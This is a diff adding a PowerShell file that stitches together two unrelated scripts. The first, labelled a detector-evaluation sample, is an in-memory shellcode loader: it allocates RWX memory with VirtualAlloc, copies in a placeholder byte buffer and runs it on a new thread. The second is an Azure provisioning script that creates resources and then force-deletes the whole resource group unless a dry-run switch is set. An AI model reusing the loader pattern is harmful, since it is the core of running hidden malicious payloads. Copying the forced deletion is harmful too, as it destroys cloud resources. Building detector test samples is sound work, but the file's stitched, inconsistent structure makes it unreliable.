@@ -1,0 +1,153 @@
+<#
+.SYNOPSIS
+    Loads a prepared binary buffer into committed memory and starts it
+    on a worker thread.
+
+.DESCRIPTION
+    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
+    into it, starts a thread and waits for completion. The buffer is a
+    placeholder supplied for static-analysis exercises.
+
+.NOTES
+    Sample generated for detector evaluation. No real payload is used.
+#>
+
+[CmdletBinding()]
+param(
+    [string]$LogPath = "$env:TEMP\loader.log"
+)
+
+$NativeCode = @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class NativeMethods
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+        uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+        uint dwFreeType);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+        uint dwCreationFlags, out uint lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+"@
+
+Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+# buffer placeholder: random bytes, replaces the encrypted stage in real samples
+$Buffer = [Byte[]] @(
+    0x3b, 0x8a, 0x40, 0x3c, 0x18, 0xe6, 0xaa, 0x00, 0xad, 0x1e, 0x29, 0xf2, 0x25, 0xe6, 0x90, 0xb5,
+    0xba, 0x50, 0xd3, 0x26, 0x8c, 0x8e, 0x3a, 0xa0, 0xa1, 0x3c, 0x97, 0x23, 0x55, 0xbc, 0x6a, 0xff,
+    0x54, 0xaf, 0xde, 0xf4, 0x9f, 0x34, 0x89, 0x79, 0x20, 0x7c, 0x65, 0x2c, 0xbc, 0x45, 0xb9, 0xfa,
+    0xdb, 0x33, 0xa6, 0x0c, 0x6e, 0x32, 0xf2, 0xc0, 0x3f, 0xa3, 0x9b, 0x33, 0x22, 0x00, 0xd1, 0x12,
+    0xd1, 0xa8, 0x56, 0xe4, 0x76, 0xed, 0xf1, 0xf7, 0x0f, 0x0b, 0xb9, 0x70, 0x8f, 0x89, 0x05, 0x1a,
+    0x42, 0xe1, 0x92, 0x85, 0x17, 0x71, 0x5e, 0xb7, 0x82, 0x3e, 0xb9, 0xb1, 0xe6, 0xf3, 0x43, 0x6d,
+    0xfb, 0xfa, 0xd5, 0x94, 0x15, 0x7e, 0xc2, 0x5d, 0x55, 0xd0, 0xbe, 0x47, 0x21, 0x87, 0xfa, 0x6b,
+    0x24, 0x1e, 0xd5, 0x36, 0xbf, 0xaf, 0xfb, 0x09, 0x47, 0xa9, 0xb3, 0xc8, 0x16, 0x4b, 0xeb, 0x25,
+    0xb3, 0x5d, 0x35, 0x3c, 0x03, 0xf1, 0xb3, 0xc9, 0x59, 0x6d, 0xfd, 0xc0, 0x64, 0xa2, 0xf4, 0xac,
+    0xfc, 0x4f, 0x61, 0x23, 0xc9, 0x13, 0x02, 0xce, 0x83, 0xea, 0x28, 0x01, 0x85, 0x8e, 0x1c, 0x4e,
+    0x8e, 0x15, 0xa8, 0x9e, 0xb9, 0xd1, 0x5a, 0xa6, 0xc1, 0xdb, 0x62, 0x6c, 0xd3, 0xfb, 0xa9, 0xfa,
+    0x11, 0xc8, 0x33, 0x3a, 0x9c, 0xa2, 0xd8, 0xbe, 0x41, 0x83, 0xc6, 0x35, 0xe7, 0x56, 0xf2, 0xa0,
+    0xaf, 0xf1, 0x69, 0x28, 0x94, 0x0a, 0x97, 0x33, 0x09, 0xf7, 0xf0, 0x14, 0xb8, 0xc6, 0xb5, 0x26,
+    0x48, 0xe3, 0xd1, 0x84, 0xe8, 0xb8, 0x39, 0x95, 0xf6, 0x87, 0x91, 0x85, 0x1c, 0xc3, 0x9f, 0x65,
+    0xd6, 0x70, 0x02, 0x5e, 0x4b, 0xef, 0xc9, 0x50, 0xd0, 0x78, 0x86, 0xf0, 0xc4, 0x35, 0x54, 0xdc,
+    0xb8, 0x8c, 0xd5, 0xbc, 0xb7, 0x81, 0x8c, 0xfe, 0xf3, 0x75, 0xc1, 0xf7, 0xff, 0xb6, 0x3d, 0xde,
+    0x27, 0x7e, 0x6c, 0x19, 0xe6, 0x26, 0xa5, 0xe4, 0x0c, 0xca, 0x15, 0xd8, 0xc7, 0xbe, 0xff, 0x60,
+    0xac, 0xfc, 0x98, 0x4e, 0x33, 0xee, 0xc0, 0xf5, 0x48, 0xbf, 0x37, 0x30, 0x25, 0x74, 0x75, 0x8f,
+    0x28
+)
+
+$HProcess = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+if ($HProcess -eq [IntPtr]::Zero) {
+    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+    return
+}
+
+[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
+$ThreadId = 0
+$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
+[void][NativeMethods]::WaitForSingleObject($Thread, 4220)
+[void][NativeMethods]::CloseHandle($Thread)
+
+$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
+#Requires -Version 5.1
+param(
+    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
+    [string]$ResourceGroup = 'rg-portal-demo-23',
+    [Parameter(Mandatory = $false)]
+    [ValidateSet('westeurope', "eastus", 'northeurope', 'uksouth')]
+    [string]$Location = 'uksouth',
+
+    [string]$TemplateFile = 'C:\Scripts\templates\portal-demo.json',
+    [string]$ParameterFile = "C:\Scripts\templates\portal-demo.parameters.json",
+
+    [string]$SubscriptionId = 'fb39e75c-d731-5b19-afa7-441e5aec04ed',
+    [string]$StorageAccount = 'stdemo6522',
+
+    [string]$VmName = 'vm-portal-demo-23',
+    [string]$OutputPath = 'C:\Logs\deploy-demo-2026-10-01.json',
+    [switch]$DryRun
+)
+
+$ErrorActionPreference = 'Stop'
+$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+if (-not (Get-Module -ListAvailable -Name Az.Resources)) {
+    throw "The Az.Resources module is not installed."
+}
+Import-Module Az.Resources -ErrorAction Stop
+
+$context = Get-AzContext
+if (-not $context) {
+    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
+}
+
+$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')
+
+if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
+    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
+    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
+}
+
+$deployParams = @{
+    ResourceGroupName     = $ResourceGroup
+    TemplateFile          = $TemplateFile
+    TemplateParameterFile = $ParameterFile
+    Name                  = $DeploymentName
+}
+$deployment = New-AzResourceGroupDeployment @deployParams -Verbose
+
+$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
+    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
+$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize
+
+$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
+    -Name $StorageAccount -Location $Location `
+    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
+Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)
+
+$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
+if ($vm) {
+    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
+    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
+}
+else {
+    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
+}
+
+$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
+Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan
+
+Remove-AzResourceGroup -Name $ResourceGroup -Force -WhatIf:$DryRun
